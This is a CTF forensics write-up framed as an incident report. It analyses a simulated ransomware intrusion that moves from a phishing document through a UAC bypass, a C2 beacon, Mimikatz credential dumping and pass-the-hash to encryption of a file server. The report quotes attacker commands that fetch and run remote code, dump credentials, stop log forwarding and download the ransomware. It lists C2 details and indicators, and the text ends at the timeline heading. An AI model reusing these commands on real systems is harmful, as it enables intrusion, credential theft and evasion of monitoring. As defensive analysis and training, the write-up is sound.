---
title:  "NexSec 2025 (Grand Finals) - Writeup"
date:   2025-12-20 13:00:00 +0800
categories: [CTF Writeup, Forensics]
tags: [NexSec 2025]
authors: [jerit3787, mynz, mont3r]
---
*By Team PERISAI Beta - Jerit3787, Mynz & mont3r*

# Incident Report: Silent Rimba Ransomware Attack

**Organization:** Corp Bhd.  
**Report Date:** December 18, 2025  
**Classification:** CONFIDENTIAL - INTERNAL USE ONLY  
**Incident ID:** IR-2025-1218-SILENTRIMBA  
**Report Version:** 1.0

---

## Table of Contents

1. [Executive Summary](#executive-summary)
2. [Incident Overview](#incident-overview)
3. [Affected Systems and Assets](#affected-systems-and-assets)
4. [Technical Analysis](#technical-analysis)
   - 4.1 [Initial Access Vector](#41-initial-access-vector)
   - 4.2 [Malware Analysis - explorer.exe (C2 Beacon)](#42-malware-analysis---explorerexe-c2-beacon)
   - 4.3 [Attack Tools Analysis](#43-attack-tools-analysis)
   - 4.4 [Lateral Movement](#44-lateral-movement)
   - 4.5 [Ransomware Execution](#45-ransomware-execution)
5. [Attack Timeline](#attack-timeline)
6. [Evidence Analysis](#evidence-analysis)
7. [Indicators of Compromise (IOCs)](#indicators-of-compromise-iocs)
8. [MITRE ATT&CK Mapping](#mitre-attck-mapping)
9. [Impact Assessment](#impact-assessment)
10. [Root Cause Analysis](#root-cause-analysis)
11. [Response and Recovery](#response-and-recovery)
12. [Recommendations and Remediation](#recommendations-and-remediation)
13. [Lessons Learned](#lessons-learned)
14. [Annexes](#annexes)

---

## Executive Summary

**Incident ID:** IR-2025-1218-SILENTRIMBA  
**Incident Severity:** Critical (P1)  
**Incident Status:** Under Remediation

**Incident Overview:** On the morning of December 18, 2025, at precisely 01:36:45 UTC+8, Corp Bhd.'s infrastructure was subjected to a sophisticated and highly coordinated ransomware attack identified as **"Silent Rimba"**. The attack was initiated through a carefully crafted phishing email containing a malicious Microsoft Word document that leveraged **Remote Template Injection (T1221)** to covertly deliver a custom .NET-based Command-and-Control (C2) beacon disguised as a legitimate Windows process.

The threat actor, operating under the GitHub handle "TomatoTerbang", demonstrated advanced capabilities throughout the attack lifecycle. Within approximately 58 minutes of initial access, the attacker successfully compromised three critical systems within Corp Bhd.'s network infrastructure: the initial workstation (WS-01-CORP), the Active Directory Domain Controller (AD-CORP), and the File Server (FS-CORP). The attack culminated in the deployment of custom ransomware that encrypted all data on the file server's D:\ drive, rendering critical business documents—including banking and financial records—completely inaccessible.

Corp Bhd.'s Security Operations Center, in collaboration with the Digital Forensics and Incident Response (DFIR) team, has conducted a comprehensive investigation into the incident. This report documents the complete attack chain, from initial phishing email delivery through ransomware execution, and provides detailed technical analysis of all malicious tools and techniques employed by the threat actor.

### Key Findings

| Aspect | Details |
|--------|---------|
| **Attack Duration** | 58 minutes (01:36:45 - 02:34:49 UTC+8) |
| **Initial Access** | Phishing email with malicious .docx attachment |
| **Patient Zero** | User `fakhri.zambri` on workstation `WS-01-CORP` |
| **C2 Server** | 209.97.175.18 (Ports 443, 7219) |
| **Systems Compromised** | 3 of 4 (WS-01-CORP, AD-CORP, FS-CORP) |
| **Systems Unaffected** | BCKP-CORP (Backup Server) |
| **Ransomware Impact** | FS-CORP D:\ drive encrypted (.anon extension) |
| **Data Exfiltrated** | ~103 MB (confirmed via PCAP analysis) |
| **Credentials Stolen** | Domain admin account `itdadmin` |

### Attack Severity: **CRITICAL**

The threat actor demonstrated exceptionally advanced capabilities throughout this operation, showcasing a sophisticated understanding of Windows internals, enterprise security architectures, and detection evasion techniques. The attacker employed custom-developed tooling with a distinctive "brain-themed" naming convention (Neurotransmitter, Cerebrum, BrocaArea), suggesting an organized and potentially recurring threat actor.

Key capabilities demonstrated include: exploitation of Remote Template Injection to bypass email security controls, leveraging a novel UAC bypass technique through Event Viewer deserialization, credential theft using Mimikatz (renamed as Neurotransmitter.exe), Pass-the-Hash lateral movement via custom SMBExec implementation (Cerebrum.ps1), and deliberate defense evasion through termination of the Splunk Forwarder service before ransomware deployment.

The attack was executed with remarkable precision and speed—from initial email delivery to complete ransomware encryption took only 58 minutes. This rapid timeline indicates significant pre-planning and reconnaissance, possibly suggesting the threat actor had prior knowledge of Corp Bhd.'s infrastructure or had conducted earlier, undetected reconnaissance activities.

**Immediate Actions:** Corp Bhd.'s SOC and DFIR teams are managing the incident response procedures. Immediate action has been taken to isolate the compromised systems from the network through VLAN segmentation. Extensive forensic data has been collected, including Sysmon event logs, Splunk aggregated logs, and network traffic captures. The backup server (BCKP-CORP) has been confirmed uncompromised, providing a viable path for data recovery.

**Stakeholder Impact:**

- **Customers:** While the primary impact was to internal file server data, the exfiltration of approximately 103 MB of data raises concerns about potential customer data exposure. Services dependent on the encrypted file server data are currently unavailable.

- **Employees:** The compromise of the Domain Controller means all domain credentials should be considered potentially compromised. The `itdadmin` account was definitively compromised with NTLM hash theft confirmed.

- **Business Operations:** Critical banking and financial documents stored on FS-CORP's D:\ drive are currently inaccessible due to ransomware encryption. Business continuity depends on successful restoration from backup.

- **Regulatory Bodies:** Depending on the nature of encrypted and potentially exfiltrated data, regulatory notification may be required under applicable data protection laws.

---

## Incident Overview

### Nature of Incident

This incident represents a targeted, multi-stage ransomware attack against Corp Bhd.'s enterprise infrastructure. The attack demonstrates characteristics of a well-planned operation with custom tooling, suggesting either a sophisticated threat actor or an organized criminal group with significant technical resources.

- **Type:** Targeted Ransomware Attack with Data Exfiltration
- **Campaign Name:** Silent Rimba (as identified in the ransomware note left on encrypted systems)
- **Threat Actor Attribution:** TomatoTerbang (identified through GitHub repositories hosting attack tools)
- **Decryption ID Provided:** AKLJNCKJN123KJANKJNC
- **Ransom Communication:** The threat actor left ransom notes on affected systems with instructions for payment, though specific ransom demands are documented separately.

### Discovery

The incident was discovered during post-attack forensic analysis through examination of Sysmon event logs collected from the File Server (FS-CORP) and aggregated Splunk logs from across the network. Network traffic analysis via PCAP capture provided additional visibility into Command-and-Control communications and data exfiltration activities.

Notably, the Splunk Forwarder service on FS-CORP was deliberately stopped by the attacker at 02:34:05, just 44 seconds before ransomware execution. This defense evasion technique successfully prevented real-time alerting during the most critical phase of the attack. The attack was only fully understood through comprehensive post-incident forensic investigation that reconstructed the complete attack chain from preserved evidence sources.

### Attack Vector Summary

```
Phishing Email → Remote Template Injection → UAC Bypass → C2 Beacon
     ↓                                                        ↓
User Opens Attachment                              Credential Theft (Mimikatz)
     ↓                                                        ↓
Macro Executes                                    Pass-the-Hash → DC Compromise
     ↓                                                        ↓
explorer.exe Deployed                              Lateral Movement → File Server
                                                              ↓
                                                  Ransomware Execution (.anon)
```

---

## Affected Systems and Assets

The unauthorized entity successfully gained control over three of four critical nodes within Corp Bhd.'s infrastructure. The attack progressed systematically from an initial workstation compromise, through domain controller takeover, to final ransomware deployment on the file server. Each compromised system served a specific purpose in the attack chain.

### Compromised Systems

| Hostname | IP Address | Role | Compromise Level | Impact |
|----------|------------|------|------------------|--------|
| WS-01-CORP | 10.10.111.51 | Workstation | Full | C2 beacon, credential theft, attack staging |
| AD-CORP | 10.10.111.176 | Domain Controller | Full | Domain admin access, complete AD compromise |
| FS-CORP | 10.10.111.58 | File Server | Full | D:\ drive encrypted, data loss |

**WS-01-CORP (Patient Zero):** This workstation, used by employee fakhri.zambri, served as the initial entry point into Corp Bhd.'s network. The system was compromised through a malicious email attachment that exploited Remote Template Injection. Once compromised, this system became the primary staging point for the attack—hosting the C2 beacon, running credential dumping tools (Mimikatz/Neurotransmitter), and initiating lateral movement to other systems. The attacker maintained persistent access to this system throughout the attack duration.

**AD-CORP (Domain Controller):** The Active Directory Domain Controller was compromised via Pass-the-Hash attack using credentials stolen from WS-01-CORP. The compromise of this system is particularly severe as it grants the attacker complete control over the domain, including access to all domain-joined systems and the ability to create, modify, or delete any domain accounts. The attacker deployed a C2 beacon on this system as well, establishing redundant command-and-control channels.

**FS-CORP (File Server):** The file server was the ultimate target of the attack. After gaining domain admin access, the attacker moved laterally to this system, deliberately stopped the Splunk Forwarder to evade detection, and deployed the BrocaArea.ps1 ransomware module. All files on the D:\ drive—containing critical banking and financial documents—were encrypted with the .anon extension, rendering them inaccessible.

### Unaffected Systems

| Hostname | IP Address | Role | Status |
|----------|------------|------|--------|
| BCKP-CORP | 10.10.111.225 | Backup Server | **NOT COMPROMISED** |

**Critical Finding - BCKP-CORP Integrity Preserved:** Forensic analysis has confirmed that the backup server (BCKP-CORP) was NOT accessed or compromised during this incident. No network connections from the C2 server or compromised systems to BCKP-CORP were observed in the PCAP data. No suspicious process creation or file access events were logged on this system. This is a critical finding as it provides a viable path for data recovery without paying the ransom. The integrity of backups stored on BCKP-CORP should be verified against known-good checksums before initiating restoration procedures.

### Affected User Accounts

| Account | Domain | Status | Impact |
|---------|--------|--------|--------|
| fakhri.zambri | CORP | Compromised | Patient zero, opened malicious document |
| itdadmin | CORP | **Critical** | NTLM hash stolen, used for lateral movement |

**fakhri.zambri:** This user account belongs to the employee who received and opened the malicious phishing email. Their workstation (WS-01-CORP) became the initial point of compromise. While their account was not directly used for lateral movement, all activities and data accessible from their workstation should be considered compromised.

**itdadmin:** This domain administrator account suffered the most severe compromise. The attacker used Mimikatz (Neurotransmitter.exe) to extract the NTLM hash (7cd2184b08d975c26b0368cb3ef4edee) from LSASS memory on WS-01-CORP. This hash was then used in Pass-the-Hash attacks to authenticate to both the Domain Controller (AD-CORP) and File Server (FS-CORP) without knowing the actual password. The presence of domain admin credentials cached on a standard workstation represents a significant security gap that enabled the rapid escalation of this attack.

---

## Technical Analysis

This section provides a comprehensive technical examination of the attack, documenting each phase from initial compromise through ransomware deployment. Evidence has been gathered from multiple sources including Sysmon event logs, Splunk aggregated data, network packet captures, and malware reverse engineering.

### 4.1 Initial Access Vector

The attack began with a carefully crafted phishing email delivered to employee fakhri.zambri on the morning of December 18, 2025. This section documents the sophisticated multi-stage delivery mechanism that enabled the threat actor to bypass traditional email security controls and achieve code execution with elevated privileges.

#### Phishing Email Delivery

At 01:36:45 UTC+8, user fakhri.zambri received a phishing email containing two Microsoft Word document attachments. Analysis of the email artifacts and Sysmon logs reveals the following sequence of events:

- **01:36:45** - `Proposal_Client.docx` was opened first, possibly as a decoy or legitimate-appearing document
- **01:37:36** - `YEAR-END-FINANCIAL-REPORT-2025.docx` was saved to the local filesystem
- **01:37:47** - The malicious YEAR-END document was opened, triggering the attack chain

The timing and naming convention of these documents suggests careful social engineering. The "YEAR-END-FINANCIAL-REPORT" filename was likely chosen to exploit end-of-year business pressures and create urgency that would override the user's security awareness training.

#### Remote Template Injection (T1221)

The YEAR-END-FINANCIAL-REPORT-2025.docx document employed a sophisticated technique known as Remote Template Injection. Unlike traditional macro-based attacks that require explicit user consent to enable macros, this technique exploits Word's legitimate template functionality to automatically fetch and execute a remote macro-enabled template without additional user interaction.

When the document was opened, Microsoft Word automatically retrieved an external template file based on a hidden relationship definition embedded within the document's XML structure:

```xml
<Relationship Type="...attachedTemplate" 
  Target="https://github.com/TomatoTerbang/fluffy-umbrella/raw/refs/heads/main/Reference.docm"/>
```

This technique is particularly insidious because:
1. **Bypasses Email Security:** The initial document contains no macros or malicious code, allowing it to pass through email filters
2. **Leverages Legitimate Functionality:** Word's template loading is a legitimate feature, making behavioral detection difficult
3. **Dynamic Payload Delivery:** The actual malicious payload is hosted externally and can be updated without modifying the original document
4. **Reduced Forensic Footprint:** The malicious template is fetched at runtime, leaving fewer artifacts for email-based detection

The template was hosted on GitHub under the repository "TomatoTerbang/fluffy-umbrella", abusing the platform's content delivery network for malware distribution.

#### Reference.docm Macro Analysis

Once Word fetched the Reference.docm template from GitHub, the embedded VBA macro executed automatically via the `Document_Open()` event handler. Our analysis of the macro document revealed sophisticated obfuscation and payload delivery mechanisms designed to evade detection and analysis.

| Property | Value |
|----------|-------|
| File Size | 39,345 bytes |
| vbaProject.bin Size | 60,416 bytes |
| XOR Encryption Key | `Qx9Zp2Lm` |
| Auto-Execution | `Document_Open()` |
| VBA Stomping | Detected |

**VBA Stomping Detection:** Analysis revealed that the VBA source code visible in standard Office tools differs from the actual compiled P-code that executes. This technique, known as "VBA Stomping," is an anti-analysis measure designed to mislead security researchers examining the macro. The actual malicious functionality is contained in the compiled P-code, not the visible VBA source.

**Obfuscation Techniques:** The macro employed multiple layers of obfuscation:
- Function names were randomized (e.g., `Boop_Snoot_99`, `Snark_Bark_12d1d3d`, `Zaphod_Beeble_Brox`)
- String literals were XOR-encrypted with the key `Qx9Zp2Lm`
- Character-by-character string construction using `Chr()` function
- Split payload delivery across two separate files

**Macro Execution Flow:**

The complete macro execution proceeded through the following stages:

1. **Auto-Execution Trigger:** `Document_Open()` fires immediately when Word loads Reference.docm, calling initialization functions `Zkr_Plx_Mwq` and `Qwerty_Asdf_Hjkl`

2. **URL Decryption:** The `Snark_Bark_12d1d3d` function decrypts hardcoded URL segments using XOR decryption with key "Qx9Zp2Lm"

3. **Payload Download (Part 1):** Using `MSXML2.XMLHTTP`, the macro downloads `rainingdroplets.txt` from GitHub, containing the first half of a Base64-encoded PE executable

4. **Payload Download (Part 2):** A second request downloads `windyseasons.txt` containing the second half of the Base64 payload

5. **Payload Assembly:** The two Base64 segments are concatenated and decoded, producing a complete Windows PE executable (36.5 MB - the C2 beacon)

6. **Payload Drop:** The decoded executable is written to `C:\Users\Public\explorer.exe`, masquerading as the legitimate Windows Explorer process

7. **Secondary Stage Trigger:** The macro executes `iex(iwr -Uri 'https://tinyurl.com/4kaz75ds')` to download and execute the UAC bypass payload

#### UAC Bypass via Event Viewer (T1548.002)

With the C2 beacon dropped to disk, the attacker faced a challenge: the beacon needed to run with elevated (administrator) privileges to perform credential theft and other privileged operations. However, User Account Control (UAC) would normally require explicit user consent for elevation.

To bypass UAC without user interaction, the macro downloaded and executed a secondary payload via a TinyURL shortlink:

```powershell
# UAC Bypass delivery - executed by the macro
iex(iwr -Uri 'https://tinyurl.com/4kaz75ds')
```

The TinyURL redirected to a PowerShell script implementing a sophisticated UAC bypass that exploits a deserialization vulnerability in the Windows Event Viewer application.

**Technical Exploitation Chain:**

The UAC bypass operates through a clever abuse of how Event Viewer handles its "Recent Views" feature:

1. **Trigger Script Creation:** A PowerShell script named `EventViewerRCE.ps1` is created at `C:\Windows\Tasks\`. This script contains the commands to execute once elevation is achieved:
   ```powershell
   Stop-Process -name mmc*  # Kill any existing MMC instances
   C:\Users\Public\explorer.exe  # Execute the C2 beacon as ADMIN
   ```

2. **Gadget Chain Construction:** A serialized .NET object file named `p4yl0ad` (1,647 bytes) is created at `C:\Windows\Tasks\`. This file contains a malicious ObjectDataProvider gadget chain that, when deserialized, executes arbitrary commands.

3. **Payload Staging:** The `p4yl0ad` file is copied to `%LOCALAPPDATA%\Microsoft\Event Viewer\RecentViews` - a location where Event Viewer stores its recent view state

4. **Auto-Elevate Trigger:** The script launches `eventvwr.exe`, a Windows application that is configured to auto-elevate without UAC prompts due to its manifest settings

5. **Deserialization Exploitation:** When Event Viewer starts, it automatically loads and deserializes the `RecentViews` file to restore its previous state. The malicious gadget chain is deserialized in the context of the elevated Event Viewer process

6. **Command Execution:** The ObjectDataProvider gadget triggers `Process.Start()`, executing:
   ```
   cmd /c powershell.exe -nop -e [Base64-encoded EventViewerRCE.ps1 execution]
   ```

7. **Elevated Beacon Execution:** At 01:40:09, the C2 beacon (`C:\Users\Public\explorer.exe`) is executed with **ADMINISTRATOR PRIVILEGES** in a HIGH INTEGRITY context

This UAC bypass technique is particularly concerning because:
- It requires no user interaction beyond opening the initial document
- It abuses legitimate Windows functionality rather than exploiting a vulnerability
- The malicious payload executes with full administrator privileges
- Detection is difficult as Event Viewer is a trusted Windows component

---

### 4.2 Malware Analysis - explorer.exe (C2 Beacon)

The primary malware component deployed in this attack is a sophisticated .NET-based Command-and-Control (C2) beacon. This section provides detailed reverse engineering analysis of the malware's capabilities, communication protocols, and anti-analysis features.

#### Sample Information

The malware was deployed to `C:\Users\Public\explorer.exe`, deliberately mimicking the legitimate Windows Explorer process name to evade casual observation. Despite its simple filename, the sample is a complex, professionally developed implant with extensive capabilities.

| Property | Value |
|----------|-------|
| **Filename** | explorer.exe |
| **Internal Name** | NetworkDiagnostic.dll |
| **Size** | 34.8 MB (36,462,199 bytes) |
| **Architecture** | x64 |
| **Framework** | .NET 6.0+ (Single-file deployment) |
| **Protection** | .NET Reactor (Obfuscation + Anti-debug + Time Bomb) |
| **Namespace** | Wirksam |
| **SHA256** | 59CEBD35102C4164A6CA164B6BDA97AFE56984CB35C3F572A66343F774474542 |

**Notable Characteristics:**

The unusually large file size (34.8 MB) is attributable to .NET 6.0's single-file deployment model, which bundles the entire .NET runtime and all dependencies into a single executable. This approach ensures the malware can execute on target systems regardless of installed .NET versions.

The internal assembly name "NetworkDiagnostic.dll" suggests the malware may have been developed under a project named "NetworkDiagnostic," possibly as part of a legitimate-appearing development effort. The namespace "Wirksam" is a German word meaning "effective" or "potent," correlating with other German-language strings found throughout the codebase.

The sample is protected with .NET Reactor, a commercial code protection tool that provides:
- Control flow obfuscation
- String encryption
- Anti-debugging measures
- Anti-tampering protection
- Possible time-bomb functionality (malware may refuse to execute outside certain date ranges)

#### Execution Flow

```
┌─────────────────────────────────────────────────────────────────────────┐
│                        EXECUTION FLOW                                    │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  1. INITIALIZATION                                                       │
│     ├── Check Mutex: 51F98B5B-ED19-F7D5-283E-B46984E8FA69A              │
│     ├── Initialize AES decryption (Key+IV from embedded config)         │
│     └── Decrypt C2 server address                                        │
│                                                                          │
│  2. ANTI-ANALYSIS CHECKS                                                 │
│     ├── Time bomb verification (expires if date check fails)            │
│     ├── Debugger detection (IsDebuggerPresent)                          │
│     └── VM/Sandbox evasion                                               │
│                                                                          │
│  3. C2 REGISTRATION                                                      │
│     ├── POST to /victim with system info                                 │
│     │   {hostname, username, privileges, OS version}                     │
│     └── Receive victim ID                                                │
│                                                                          │
│  4. HEARTBEAT LOOP (every 5 seconds)                                     │
│     ├── POST to /heart (keep-alive)                                      │
│     └── GET from /command (poll for tasking)                             │
│                                                                          │
│  5. COMMAND EXECUTION                                                    │
│     ├── Parse command (PowerShell, native, or special)                   │
│     ├── Execute and capture output                                       │
│     └── POST results to /result                                          │
│                                                                          │
│  6. FILE OPERATIONS                                                      │
│     ├── GET from /file (download additional payloads)                    │
│     └── POST to /file (exfiltrate data)                                  │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

#### C2 Configuration

Network traffic analysis and malware reverse engineering revealed the C2 beacon's communication infrastructure and operational parameters.

| Parameter | Value |
|-----------|-------|
| **C2 Server IP** | 209.97.175.18 |
| **Primary Port** | 443 (HTTPS) |
| **Exfiltration Port** | 7219 |
| **Beacon Interval** | 5 seconds |
| **SSL Validation** | Disabled (accepts self-signed certificates) |

**Communication Architecture:**

The C2 beacon employs HTTPS on port 443 for primary command-and-control communications, blending with legitimate web traffic to evade network-based detection. A secondary channel on port 7219 appears dedicated to data exfiltration operations, potentially to separate command traffic from bulk data transfers.

The 5-second beacon interval is aggressive, ensuring the attacker can issue commands with minimal latency. However, this frequent check-in also creates opportunities for network-based detection through traffic pattern analysis.

Critically, SSL certificate validation is disabled in the implant. This allows the C2 server to use self-signed certificates while also making the malware resilient to certificate changes. However, it also means the malware would connect to any server presenting itself at the configured IP address, a potential avenue for sinkholing or takeover.

**C2 Endpoints Identified:**

| Endpoint | Method | Purpose |
|----------|--------|--------|
| `/victim` | POST | Initial registration with system info |
| `/heart` | POST | Heartbeat/keep-alive signal |
| `/command` | GET | Poll for pending commands |
| `/result` | POST | Return command execution output |
| `/file` | GET/POST | File download/upload operations |
| `/keys` | GET | Retrieve encryption keys (for ransomware) |

#### AES-256-CBC Encryption (Config Strings)

| Component | Base64 Value |
|-----------|--------------|
| **Key** | wWrx+62b7++4exaVvcwZRy3QNnd+KBGuEZcW46Ho6E4= |
| **IV** | ERQOOQ4Cz2cyehEUrqfhLA== |

#### Command System

The C2 beacon uses German-themed command names:

| Command | German Meaning | Function |
|---------|----------------|----------|
| **Ertrag** | "Yield/Output" | Execute command, return results |
| **Riegel** | "Lock/Bolt" | **RANSOMWARE TRIGGER** |
| **Holen** | "Fetch/Get" | Download file from C2 |
| **Senden** | "Send" | Upload/exfiltrate file to C2 |

#### Anti-Analysis Features

1. **Obfuscated Function Names:** BonkersYonkersZap, TwiddleFadoodleSnap, FlibbityGibbityWham
2. **Dead Code Injection:** Non-functional code paths for confusion
3. **Control Flow Flattening:** Switch-case based execution
4. **.NET Reactor Protection:** Commercial-grade obfuscation
5. **Time Bomb:** Checks system date, exits if outside valid range

---

### 4.3 Attack Tools Analysis

The threat actor deployed a suite of attack tools with a distinctive naming convention based on brain anatomy and neuroscience terminology. This thematic consistency suggests an organized threat actor with established tooling and operational procedures. This section provides detailed analysis of each tool identified during the investigation.

#### Tools Downloaded from GitHub (TomatoTerbang/BrainRil)

The attacker maintained two GitHub repositories for hosting attack infrastructure:
- **TomatoTerbang/fluffy-umbrella:** Initial access components (macro template, C2 beacon payloads)
- **TomatoTerbang/BrainRil:** Post-exploitation tools (credential theft, lateral movement, ransomware)

| Tool | File | Purpose | Status |
|------|------|---------|--------|
| Mimikatz | Neurotransmitter.exe | Credential dumping | **EXECUTED** |
| SMBExec/PtH | Cerebrum.ps1 | Pass-the-Hash | **EXECUTED** |
| PsExec | Brainstemo.exe | Remote execution | Staged only |
| NetExec | Salad.exe (nxc.exe) | SMB enumeration | Staged only |
| Ransomware | BrocaArea.ps1 | File encryption | **EXECUTED** |

**Staged vs. Executed Tools:**
Notably, not all tools downloaded by the attacker were actually used. Both Brainstemo.exe (PsExec) and Salad.exe (NetExec) were staged but never executed. This suggests:
- The attacker had backup options for lateral movement if their primary method failed
- Cerebrum.ps1 (SMBExec via WMI) was sufficient for their needs
- The staged tools may indicate standard operating procedures that include multiple options

#### Brain-Themed Naming Convention

The consistent brain-themed naming convention provides insight into the threat actor's organizational approach and could serve as an attribution indicator:

| Original Tool | BrainRil Name | Reference |
|---------------|---------------|-----------|
| Mimikatz | Neurotransmitter.exe | Neurotransmitters = chemical signals between neurons |
| SMBExec | Cerebrum.ps1 | Cerebrum = largest part of brain, responsible for decision-making |
| PsExec | Brainstemo.exe | Brainstem = controls vital automatic functions |
| Ransomware | BrocaArea.ps1 | Broca's Area = brain region responsible for language/speech |

This naming convention serves multiple purposes:
- Provides a consistent brand/identity for the toolset
- May evade signature-based detection looking for original tool names
- Demonstrates organizational sophistication and custom tool development
- Could potentially link this attack to other incidents using the same naming scheme

#### Credential Theft via Neurotransmitter.exe (Mimikatz)

Mimikatz, renamed as "Neurotransmitter.exe" to evade signature detection, is a widely-known credential extraction tool capable of extracting plaintext passwords, NTLM hashes, and Kerberos tickets from Windows memory.

The following commands were observed in Sysmon logs, executed between 02:19:57 and 02:20:04:

```powershell
# LSA dump - Extract credentials from Local Security Authority Secrets
"C:\Windows\Temp\Neurotransmitter.exe" "lsadump::lsa /inject" exit

# Logonpasswords - Extract cached credentials from LSASS memory
"C:\Windows\Temp\Neurotransmitter.exe" "sekurlsa::logonpasswords" exit
```

**Credentials Successfully Stolen:**

| Account | Domain | NTLM Hash |
|---------|--------|-----------|
| itdadmin | CORP | 7cd2184b08d975c26b0368cb3ef4edee |

The theft of the `itdadmin` domain administrator hash was the pivotal moment in the attack. This single credential enabled all subsequent lateral movement and ultimately the ransomware deployment. The presence of such a high-privilege credential cached on a standard workstation represents a critical security gap.

**Why Mimikatz Succeeded:**
- No Credential Guard or other LSASS protection mechanisms were active
- Protected Process Light (PPL) for LSASS was not enabled
- No EDR with Mimikatz behavioral detection was present
- The attacker had administrative privileges (via UAC bypass) required for LSASS access

---

### 4.4 Lateral Movement

With credentials in hand, the attacker proceeded to expand their foothold across Corp Bhd.'s network. This section documents the lateral movement techniques employed to compromise the Domain Controller (AD-CORP) and ultimately the File Server (FS-CORP).

#### Pass-the-Hash Attack (T1550.002)

Pass-the-Hash (PtH) is an attack technique that allows an attacker to authenticate to remote systems using the NTLM hash of a user's password, without needing to know the actual plaintext password. This technique exploits a fundamental weakness in NTLM authentication where the hash itself serves as proof of identity.

At **02:22:50 UTC+8**, approximately 43 minutes after initial compromise, the attacker launched a Pass-the-Hash attack against the Domain Controller using the stolen `itdadmin` credentials:

```powershell
Import-Module C:\Windows\Temp\Cerebrum.ps1
Invoke-LargeBrain -target 10.10.111.176 -Domain corp.local 
  -hash 7cd2184b08d975c26b0368cb3ef4edee 
  -username itdadmin 
  -command 'powershell -e [BASE64_PAYLOAD]'
```

The `Invoke-LargeBrain` function is a custom implementation of SMBExec-style Pass-the-Hash attack. The brain-themed naming ("LargeBrain") follows the attacker's consistent naming convention across their toolset.

**Attack Flow - Domain Controller Compromise:**

1. **Authentication:** The Cerebrum.ps1 script authenticates to AD-CORP (10.10.111.176) using the NTLM hash instead of a plaintext password. From the perspective of the Domain Controller, this is a legitimate authentication from the `itdadmin` account.

2. **WMI Execution:** Upon successful authentication, the script leverages Windows Management Instrumentation (WMI) to execute commands on the remote system. WMI is a legitimate Windows administration framework, making this activity difficult to distinguish from normal administrative operations.

3. **Payload Delivery:** The WMI Provider Host process (`WmiPrvSE.exe`) spawns on AD-CORP at 02:22:52, executing the attacker's obfuscated PowerShell payload. This payload uses Deflate compression and Base64 encoding to evade signature-based detection.

4. **Beacon Deployment:** The payload downloads and executes the same C2 beacon (`explorer.exe`) to `C:\Users\Public\` on the Domain Controller.

5. **C2 Establishment:** At 02:23:10, the Domain Controller establishes its own C2 connection to 209.97.175.18, giving the attacker direct command-and-control access to the heart of Corp Bhd.'s Active Directory infrastructure.

**Why WMI?**

The attacker chose WMI-based execution over alternatives like PsExec for several tactical reasons:
- WMI does not require deploying a service on the target (unlike PsExec's PSEXESVC)
- WMI activity often blends with legitimate system administration
- Fewer forensic artifacts are created compared to service-based execution
- Many organizations do not adequately monitor WMI activity

#### Lateral Movement to File Server

With Domain Controller access secured, the attacker's final objective became clear: the File Server (FS-CORP) containing critical business data.

At **02:34:05 UTC+8**, the attacker initiated lateral movement to FS-CORP using the same Pass-the-Hash technique. However, before executing the ransomware payload, the attacker took a critical defense evasion step:

```powershell
# First action on FS-CORP - disable monitoring
sc stop SplunkForwarder
```

By stopping the Splunk Forwarder service, the attacker prevented real-time log forwarding to the SIEM. This created a blind spot in Corp Bhd.'s monitoring capabilities precisely when the most damaging phase of the attack—ransomware execution—was about to occur.

The sequence of events on FS-CORP reveals careful operational security:

1. **02:34:05** - Splunk Forwarder stopped (defense evasion)
2. **02:34:19** - BrocaArea.ps1 ransomware downloaded from GitHub
3. **02:34:49** - Ransomware executed (just 44 seconds after disabling monitoring)

---

### 4.5 Ransomware Execution

The final phase of the attack involved the deployment of custom ransomware to encrypt critical business data on the File Server. This section documents the ransomware's behavior and the defense evasion techniques employed to ensure successful execution.

#### Defense Evasion - Splunk Forwarder Termination

Before executing the ransomware, the attacker took deliberate steps to disable Corp Bhd.'s monitoring capabilities:

```powershell
# 02:34:05 - Stop monitoring before ransomware deployment
sc stop SplunkForwarder
```

This defense evasion technique (MITRE T1562.001 - Impair Defenses: Disable or Modify Tools) is commonly employed by sophisticated ransomware operators. By stopping the log forwarding service:

- Real-time alerts for the ransomware activity were prevented
- The SOC lost visibility into FS-CORP during the critical attack window
- Forensic analysis would need to rely on local logs rather than centralized SIEM data
- The 44-second gap between service termination and ransomware execution suggests this was a planned, practiced procedure

**Failed Initial Attempt on WS-01-CORP:**

Notably, the attacker first attempted to execute the ransomware on the initial workstation (WS-01-CORP) at 02:17:00, approximately 17 minutes before the successful execution on FS-CORP. This attempt appears to have failed, possibly due to:
- Endpoint protection detection
- Insufficient privileges at that moment
- Execution errors in the ransomware script

The attacker then pivoted to targeting FS-CORP directly, where they ensured success by first disabling the monitoring service.

#### Ransomware Deployment

With monitoring disabled, the attacker proceeded to download and execute the ransomware module:

```powershell
# 02:34:19 - Download ransomware module from GitHub
iwr -Uri "https://github.com/TomatoTerbang/BrainRil/raw/refs/heads/main/BrocaArea" 
    -Outfile 'C:\Windows\Temp\BrocaArea.ps1'

# 02:34:49 - Execute ransomware
Import-Module 'C:\Windows\Temp\BrocaArea.ps1'
Invoke-Broca
```

The ransomware module, named `BrocaArea.ps1` after the brain region responsible for language (continuing the attacker's brain-themed naming convention), is a PowerShell-based file encryption tool. The primary function `Invoke-Broca` handles the encryption process.

#### Encryption Behavior and Impact

Based on forensic analysis, the ransomware exhibited the following behavior:

- **Target Selection:** The ransomware specifically targeted the D:\ drive on FS-CORP, which contained the organization's critical file shares including banking documents and financial reports
  
- **File Extension:** All encrypted files were renamed with the `.anon` extension appended to their original names, making it immediately apparent which files were affected
  
- **Completion Marker:** Upon successful encryption, the ransomware created a marker file at `C:\ProgramData\greenlight.dat`. This file likely signals to other attack components that encryption is complete and may contain encryption metadata
  
- **Encryption Scope:** The entire D:\ drive data partition was encrypted, rendering all business documents inaccessible
  
- **Estimated Data Impact:** Based on PCAP analysis showing approximately 103 MB of exfiltrated data and 150+ MB of encrypted content, the ransomware affected a substantial portion of critical business data

**Ransom Note:**

A ransom note was left on the affected systems identifying the attack as "Silent Rimba" and providing a Decryption ID of `AKLJNCKJN123KJANKJNC`. This ID would presumably be used to identify the victim when contacting the threat actor for decryption.

**Note on Encryption Keys:**

It is important to distinguish between the AES encryption key found in the C2 beacon (used for config string obfuscation) and the file encryption key used by the ransomware. The ransomware likely generates or retrieves unique encryption keys per victim, potentially from the C2 server's `/keys` endpoint. The C2 config encryption key (wWrx+62b7++4exaVvcwZRy3QNnd+KBGuEZcW46Ho6E4=) is NOT the file decryption key and cannot be used to recover encrypted files.

---

## Attack Timeline

